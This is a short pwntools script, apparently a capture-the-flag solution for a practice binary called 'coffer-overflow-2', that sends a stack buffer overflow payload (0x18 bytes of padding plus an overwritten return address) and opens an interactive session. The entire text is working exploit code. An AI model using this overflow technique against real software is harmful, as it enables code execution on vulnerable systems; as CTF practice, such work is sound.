from pwn import *

p = process("./bin/coffer-overflow-2")

gdb.attach(p)
p.sendline("A" * 0x18 + p64(0x4006e6) * 2)

p.interactive()
